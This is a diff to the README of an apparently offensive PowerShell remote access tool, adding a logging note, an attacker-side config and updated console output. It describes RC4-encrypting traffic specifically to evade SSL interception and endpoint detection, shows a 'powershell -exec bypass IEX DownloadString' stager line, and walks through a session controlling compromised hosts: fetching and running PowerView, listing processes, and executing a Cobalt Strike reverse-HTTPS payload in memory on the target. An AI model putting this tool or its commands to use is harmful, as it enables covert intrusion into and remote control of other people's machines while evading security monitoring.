@@ -9,6 +9,9 @@ apt install redis-server
 apt install python-redis
 ```
 
+# Logs
+Every errors, http requests and commands are logged in the logs folder.
+
 # How it works
 
 Once the PowerShell script is executed and HTTP request will be issued to the server. The body of each POST request contains the RC4 encrypted communication. Why RC4 because it's strong enough to hide the traffic. The idea is to upload / download data over the network that cannot be inspected. The RAT support HTTPS but some security product may perform SSL interception and obtain visibility on your data leading to detection of malicious payload (PowerShell script, stager etc...). The RC4 encryption allow you to communicate over the wire without leaking your payload. The RC4 encryption also protect against endpoint agent that inspect traffic directly on the host, again the traffic is decrypted at the "software" level blocking detection at that level too.
@@ -35,8 +38,22 @@ powershell -exec bypass IEX (New-Object Net.WebClient).DownloadString("http://ri
 
 Attacker side example:
 
+* default.json:
 ```
+{
+        "redis-host": "localhost",
+        "redis-port": 6379,
 
+        "http-host": "192.168.17.129",
+        "http-port": 8080,
+        "http-server": "Microsoft-IIS/7.5",
+
+        "https-enabled": "off",
+        "https-cert-path": "cert.pem",
+
+        "encryption-key": "test",
+        "max-output-timeout": 5
+}
 ```
 
 ```
@@ -72,15 +89,24 @@ Help Menu
 List of active shells
 -----------------------
 
-  11    10.0.0.153:RingZer0\MrUn1k0d3r
-  13    10.0.0.153:RingZer0\MrUn1k0d3r
-  5     10.0.0.153:RingZer0\MrUn1k0d3r
-  2     10.0.0.153:RingZer0\MrUn1k0d3r
-  3     10.0.0.153:RingZer0\MrUn1k0d3r
+  4       x64  -  10.0.0.153:RingZer0\MrUn1k0d3r
+  3       x64  -  10.0.0.153:RingZer0\MrUn1k0d3r
+  2       x64  -  10.0.0.153:RingZer0\MrUn1k0d3r
+  1       x64  -  10.0.0.153:RingZer0\MrUn1k0d3r
 
-(Main)>>> interact 13
+(Main)>>> list full
 
-(10.0.0.153:RingZer0\MrUn1k0d3r)>>> help
+List of active shells
+-----------------------
+
+  4       x64  -  10.0.0.153:RingZer0\MrUn1k0d3r 2836ccdc-6747-45a4-8461-fa4022ac6bd0 last seen 13/09/2017 09:59:32
+  3       x64  -  10.0.0.153:RingZer0\MrUn1k0d3r d09093a0-d3d7-4de9-b3a9-191ab7b2fef1 last seen 13/09/2017 09:54:31
+  2       x64  -  10.0.0.153:RingZer0\MrUn1k0d3r 8d95e7c8-6868-4eb3-8ba8-231a1fdfcb92 last seen 13/09/2017 09:50:18
+  1       x64  -  10.0.0.153:RingZer0\MrUn1k0d3r 90c608da-b64d-4d3a-9336-458e73658e49 last seen 12/09/2017 18:27:47
+
+(Main)>>> interact 4
+
+(x64 - 10.0.0.153:RingZer0\MrUn1k0d3r)>>> help
 
 Shell Help Menu
 -----------------------
@@ -91,6 +117,8 @@ Shell Help Menu
         exec          args (path/url)           In memory execution of code (shellcode)
         read          args (remote path)        Read a file on the remote host
         upload        args (path/url, path)     Upload a file on the remote system
+        ps                                      List processes
+        powerless     args (powershell)         Execute Powershell command without invoking Powershell
         delay         args (milliseconds)       Update the callback delay
         help                                    Show this help menu
 
@@ -106,35 +134,46 @@ List of path alias
         inveigh                 Invoke-Inveigh utility
         powerview               PowerView tool set)
 
-(10.0.0.153:RingZer0\MrUn1k0d3r)>>> whoami
+(x64 - 10.0.0.153:RingZer0\MrUn1k0d3r)>>> whoami
 RingZer0\MrUn1k0d3r
 
-
-
-(10.0.0.153:RingZer0\MrUn1k0d3r)>>> delay 0
+(x64 - 10.0.0.153:RingZer0\MrUn1k0d3r)>>> delay 0
 Updating delay to 0
 Delay is now 0
 
 
-(10.0.0.153:RingZer0\MrUn1k0d3r)>>> fetch powerview Get-NetLocalGroup -ComputerName 127.0.0.1
+(x64 - 10.0.0.153:RingZer0\MrUn1k0d3r)>>> fetch powerview Get-NetLocalGroup -ComputerName 127.0.0.1
 [+] Fetching https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
 [+] Executing Get-NetLocalGroup -ComputerName 127.0.0.1
 
 
-(10.0.0.153:RingZer0\MrUn1k0d3r)>>> refresh
+(x64 - 10.0.0.153:RingZer0\MrUn1k0d3r)>>> refresh
 
 
 ComputerName : 127.0.0.1
 AccountName  : 10-R90G3RLC-1GG/Administrator
 IsDomain     : False
 IsGroup      : False
-SID          : S-1-5-21-630091541-2956043977-842813908-500
+SID          : S-1-5-21-
 Description  : Built-in account for administering the computer/domain
 PwdLastSet   : 8/11/2017 6:01:45 PM
 PwdExpired   : False
 UserFlags    : 66049
 Disabled     : False
 LastLogin    : 8/11/2017 5:58:47 PM
+
+(x64 - 10.0.0.153:RingZer0\MrUn1k0d3r)>>> ps
+
+ PID Name                       Owner                    CommandLine
+ --- ----                       -----                    -----------
+   0 System Idle Process
+   4 System
+ 364 smss.exe
+ 492 csrss.exe
+
+(x64 - 10.0.0.153:RingZer0\MrUn1k0d3r)>>> exec /home/attacker/cobaltstrike-reverse-https
+[+] Fetching /home/attacker/cobaltstrike-reverse-https
+[+] Payload should be executed shortly on the target
 ```
 
 # Todo
